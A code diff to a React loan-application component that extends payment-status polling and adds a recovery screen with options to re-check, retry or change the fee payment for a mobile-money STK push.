@@ -187,6 +187,11 @@ function QuickLoansContent() {
   const [selectedTier, setSelectedTier] = useState<{amount: number, fee: number} | null>(null);
   const [trackingId] = useState(`LN-${Math.random().toString(36).substr(2, 8).toUpperCase()}`);
   const [checkoutRequestId, setCheckoutRequestId] = useState('');
+  const [recoveryData, setRecoveryData] = useState<{
+    retryCount: number;
+    originalAmount: string;
+    phone: string;
+  } | null>(null);
 
   // UI
   const [loadingText, setLoadingText] = useState('');
@@ -310,57 +315,207 @@ function QuickLoansContent() {
     }, 4000);
   };
 
-  // POLLING LOGIC
+  // ENHANCED POLLING LOGIC
   const startPolling = (reqId: string) => {
     let attempts = 0;
-    const MAX_ATTEMPTS = 120; // 4 Minutes
+    const MAX_ATTEMPTS = 180; // 180 * 2s = 360s (6 Minutes total)
+    const PIN_ENTRY_GRACE_PERIOD = 10; // Wait 10 attempts (20s) before showing messages
 
     pollingInterval.current = setInterval(async () => {
-        attempts++;
-        try {
-            const res = await fetch(`/api/check-status?id=${reqId}`);
-            const data = await res.json();
-            
-            if (data.status === 'COMPLETED') {
-                handlePaymentSuccess();
-            } else if (data.status === 'FAILED') {
-                if (pollingInterval.current) clearInterval(pollingInterval.current);
-                setStep('failed');
-            } else {
-                setPollMessage(attempts % 2 === 0 ? 'Waiting for PIN...' : 'Processing...');
-            }
-            
-            // Timeout Logic - Soft Fail
-            if (attempts >= MAX_ATTEMPTS) {
-                if (pollingInterval.current) clearInterval(pollingInterval.current);
-                setStep('payment_check');
-            }
-        } catch(e) {}
+      attempts++;
+      
+      // Show appropriate messages based on time elapsed
+      if (attempts === PIN_ENTRY_GRACE_PERIOD) {
+        setPollMessage('Please check your phone and enter PIN...');
+      } else if (attempts === 60) { // After 2 minutes
+        setPollMessage('Transaction taking longer than usual...');
+      } else if (attempts === 120) { // After 4 minutes
+        setPollMessage('Still waiting for confirmation...');
+      } else if (attempts % 30 === 0) { // Every minute
+        // Rotate waiting messages
+        const waitingMessages = [
+          'Waiting for payment confirmation...',
+          'Still processing...',
+          'Checking payment status...'
+        ];
+        setPollMessage(waitingMessages[(attempts / 30) % waitingMessages.length]);
+      }
+
+      try {
+        const res = await fetch(`/api/check-status?id=${reqId}&action=poll`);
+        const data = await res.json();
+        
+        if (data.status === 'COMPLETED') {
+          handlePaymentSuccess();
+        } else if (data.status === 'FAILED') {
+          if (pollingInterval.current) clearInterval(pollingInterval.current);
+          setStep('failed');
+        } else {
+          // Keep polling - message already set above
+        }
+
+        // Soft Timeout Logic - Go to recovery screen instead of failing
+        if (attempts >= MAX_ATTEMPTS) {
+          if (pollingInterval.current) clearInterval(pollingInterval.current);
+          // Store recovery data before transitioning
+          setRecoveryData({
+            retryCount: data.retryCount || 0,
+            originalAmount: data.originalAmount || (selectedTier?.fee.toString() || ''),
+            phone: data.phone || phone
+          });
+          // Go to recovery screen
+          setStep('payment_check');
+        }
+      } catch(e) {
+        console.error('Polling error:', e);
+      }
     }, 2000);
   };
 
-  // MANUAL CHECK
+  // ENHANCED MANUAL CHECK
   const handleManualFetch = async () => {
+    if (!checkoutRequestId) return;
+    
     setManualCheckLoading(true);
+    setErrorMsg('');
+    
     try {
-      const res = await fetch(`/api/check-status?id=${checkoutRequestId}`);
+      // First, record the fetch attempt
+      const recordRes = await fetch('/api/payment-recovery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'fetch_payment',
+          checkoutRequestId: checkoutRequestId
+        })
+      });
+      
+      const recordData = await recordRes.json();
+      
+      if (!recordData.success) {
+        // If transaction not found or too old
+        if (recordData.recoveryAction === 'select_new') {
+          setErrorMsg('Transaction expired. Please select a new amount.');
+          setTimeout(() => {
+            setManualCheckLoading(false);
+            setStep('select'); // Go back to select screen
+          }, 1500);
+          return;
+        }
+      }
+      
+      // Now check the actual status
+      const res = await fetch(`/api/check-status?id=${checkoutRequestId}&action=fetch`);
       const data = await res.json();
       
+      // Wait to show loading state
       setTimeout(() => {
-          setManualCheckLoading(false);
-          if (data.status === 'COMPLETED') {
-              handlePaymentSuccess();
-          } else if (data.status === 'FAILED') {
-              setStep('failed');
+        setManualCheckLoading(false);
+        
+        if (data.status === 'COMPLETED') {
+          handlePaymentSuccess();
+        } else if (data.status === 'FAILED') {
+          setStep('failed');
+        } else if (data.status === 'PENDING') {
+          // Check if transaction is old (more than 10 minutes)
+          const currentTime = Date.now();
+          const transactionTime = recoveryData ? currentTime - (10 * 60 * 1000) : currentTime;
+          
+          if (recoveryData && data.networkError) {
+            setErrorMsg('Network error. Please check your connection and try again.');
           } else {
-              alert("We still haven't received confirmation. Please wait 30 seconds and check again.");
+            setErrorMsg('We still haven\'t received confirmation. If you paid, wait 30 seconds and try again, or use the options below.');
           }
+        }
       }, 1500);
 
     } catch (error) {
-        setManualCheckLoading(false);
-        alert("Connection error. Please try again.");
+      setManualCheckLoading(false);
+      setErrorMsg('Connection error. Please try again.');
     }
+  };
+
+  // HANDLE RETRY SAME PAYMENT
+  const handleRetrySamePayment = async () => {
+    if (!checkoutRequestId || !selectedTier) return;
+    
+    setIsProcessing(true);
+    setErrorMsg('');
+    
+    try {
+      // Check if we can retry
+      const checkRes = await fetch('/api/payment-recovery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'retry_same',
+          checkoutRequestId: checkoutRequestId
+        })
+      });
+      
+      const checkData = await checkRes.json();
+      
+      if (!checkData.success) {
+        setIsProcessing(false);
+        if (checkData.recoveryAction === 'select_new') {
+          setErrorMsg(checkData.error || 'Please select a new amount.');
+          setTimeout(() => {
+            setStep('select');
+          }, 1500);
+        } else {
+          setErrorMsg(checkData.error || 'Cannot retry payment.');
+        }
+        return;
+      }
+      
+      // Retry the payment with same details
+      const res = await fetch('/api/stkpush', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phoneNumber: phone,
+          idNumber: details.idNumber,
+          amount: selectedTier.fee,
+          serviceType: 'LOAN_FEE'
+        })
+      });
+
+      const data = await res.json();
+      
+      if (data.success) {
+        setIsProcessing(false);
+        setCheckoutRequestId(data.checkoutRequestID);
+        setStep('stk_push');
+        startPolling(data.checkoutRequestID);
+      } else {
+        setIsProcessing(false);
+        setErrorMsg(data.error || 'Failed to retry payment');
+      }
+    } catch (err) {
+      setIsProcessing(false);
+      setErrorMsg('Network error. Please try again.');
+    }
+  };
+
+  // HANDLE CHOOSE DIFFERENT AMOUNT
+  const handleChooseDifferentAmount = () => {
+    // Clear any existing polling
+    if (pollingInterval.current) {
+      clearInterval(pollingInterval.current);
+      pollingInterval.current = null;
+    }
+    
+    // Reset payment-related states but keep user details
+    setCheckoutRequestId('');
+    setSelectedTier(null);
+    setTermsAccepted(false);
+    setIsProcessing(false);
+    setManualCheckLoading(false);
+    setErrorMsg('');
+    
+    // Go back to select screen
+    setStep('select');
+    window.scrollTo(0, 0);
   };
 
   // Cleanup
@@ -695,43 +850,135 @@ function QuickLoansContent() {
         </div>
       )}
 
-      {/* ================= STEP 6.5: MANUAL CHECK ================= */}
+      {/* ================= STEP 6.5: SMART RECOVERY SCREEN ================= */}
       {step === 'payment_check' && selectedTier && (
-             <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
-                 <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                    <SearchCheck className="w-10 h-10 text-yellow-600" />
-                </div>
+        <div className="text-center pt-8 animate-in zoom-in-95 duration-500">
+          <div className="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
+            <SearchCheck className="w-10 h-10 text-yellow-600" />
+          </div>
+          
+          <h2 className="text-2xl font-black text-slate-900 mb-2">Payment Check Required</h2>
+          <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
+            We haven't received automatic confirmation yet. This could be because:
+          </p>
+          
+          <div className="bg-white p-5 rounded-xl shadow-lg border border-slate-100 mb-6 text-left space-y-3">
+            <div className="flex items-start gap-3">
+              <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                <span className="text-blue-600 text-xs font-bold">1</span>
+              </div>
+              <div>
+                <p className="text-sm font-bold text-slate-900">You haven't entered your PIN yet</p>
+                <p className="text-xs text-slate-500">Check your phone for the STK prompt</p>
+              </div>
+            </div>
+            
+            <div className="flex items-start gap-3">
+              <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                <span className="text-blue-600 text-xs font-bold">2</span>
+              </div>
+              <div>
+                <p className="text-sm font-bold text-slate-900">Network delays</p>
+                <p className="text-xs text-slate-500">Payment might still be processing</p>
+              </div>
+            </div>
+            
+            <div className="flex items-start gap-3">
+              <div className="w-6 h-6 bg-blue-100 rounded-full flex items-center justify-center shrink-0 mt-0.5">
+                <span className="text-blue-600 text-xs font-bold">3</span>
+              </div>
+              <div>
+                <p className="text-sm font-bold text-slate-900">Payment completed but not detected</p>
+                <p className="text-xs text-slate-500">Use the button below to check</p>
+              </div>
+            </div>
+          </div>
+          
+          <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6 space-y-4">
+            {errorMsg && (
+              <div className="bg-red-50 p-3 rounded-xl flex items-center gap-2 text-red-600 text-xs font-bold">
+                <AlertCircle className="w-4 h-4" /> {errorMsg}
+              </div>
+            )}
+            
+            <div className="space-y-3">
+              <Button 
+                onClick={handleManualFetch}
+                disabled={manualCheckLoading}
+                className="w-full h-14 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
+              >
+                {manualCheckLoading ? (
+                  <Loader2 className="w-5 h-5 animate-spin" />
+                ) : (
+                  <SearchCheck className="w-5 h-5" />
+                )}
+                <span>Try to Fetch Payment</span>
+              </Button>
+              
+              <div className="relative flex items-center">
+                <div className="flex-grow border-t border-slate-200"></div>
+                <span className="flex-shrink mx-4 text-xs text-slate-400 font-bold">OR</span>
+                <div className="flex-grow border-t border-slate-200"></div>
+              </div>
+              
+              <div className="grid grid-cols-2 gap-3">
+                <Button 
+                  onClick={handleRetrySamePayment}
+                  disabled={isProcessing}
+                  variant="outline"
+                  className="h-14 border-2 border-slate-200 hover:border-emerald-400 text-slate-700 font-bold rounded-xl"
+                >
+                  {isProcessing ? (
+                    <Loader2 className="w-4 h-4 animate-spin mx-auto" />
+                  ) : (
+                    <>
+                      <RefreshCcw className="w-4 h-4 mr-2" />
+                      Retry Same
+                    </>
+                  )}
+                </Button>
                 
-                <h2 className="text-2xl font-black text-slate-900 mb-2">Taking a while?</h2>
-                <p className="text-slate-500 font-medium mb-6 px-4 text-sm leading-relaxed">
-                    We haven't received the completion signal yet. If you have already entered your PIN, click the button below to verify.
-                </p>
-                
-                <div className="bg-white p-6 rounded-xl shadow-lg border border-slate-100 mb-6">
-                    <Button 
-                        onClick={handleManualFetch}
-                        disabled={manualCheckLoading}
-                        className="w-full h-14 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-xl shadow-lg flex items-center justify-center gap-2"
-                    >
-                         {manualCheckLoading ? (
-                            <Loader2 className="w-5 h-5 animate-spin" />
-                        ) : (
-                            <CheckCircle2 className="w-5 h-5" />
-                        )}
-                        <span>I have completed payment</span>
-                    </Button>
-
-                    <div className="mt-4 border-t border-slate-50 pt-4">
-                         <p className="text-xs text-slate-400 font-medium mb-2">Did the prompt fail to appear?</p>
-                         <button 
-                            onClick={() => setStep('summary')} 
-                            className="text-xs font-bold text-slate-600 hover:text-blue-600"
-                        >
-                            Retry Transaction
-                        </button>
-                    </div>
+                <Button 
+                  onClick={handleChooseDifferentAmount}
+                  variant="outline"
+                  className="h-14 border-2 border-slate-200 hover:border-emerald-400 text-slate-700 font-bold rounded-xl"
+                >
+                  <CreditCard className="w-4 h-4 mr-2" />
+                  Different Amount
+                </Button>
+              </div>
+            </div>
+            
+            <div className="pt-4 border-t border-slate-50 text-center">
+              <p className="text-xs text-slate-400 font-medium mb-2">
+                Transaction Details
+              </p>
+              <div className="text-xs text-slate-600 font-mono bg-slate-50 p-3 rounded-lg">
+                <div className="flex justify-between">
+                  <span>Amount:</span>
+                  <span className="font-bold">KES {selectedTier.fee}</span>
                 </div>
-             </div>
+                <div className="flex justify-between mt-1">
+                  <span>Phone:</span>
+                  <span className="font-bold">{phone}</span>
+                </div>
+                {recoveryData && recoveryData.retryCount > 0 && (
+                  <div className="flex justify-between mt-1">
+                    <span>Retry attempts:</span>
+                    <span className="font-bold">{recoveryData.retryCount}</span>
+                  </div>
+                )}
+              </div>
+            </div>
+          </div>
+          
+          <button 
+            onClick={() => setStep('summary')}
+            className="text-xs font-bold text-slate-400 hover:text-slate-600"
+          >
+            ← Back to payment summary
+          </button>
+        </div>
       )}
 
       {/* ================= STEP 6.6: PROCESSING ================= */}
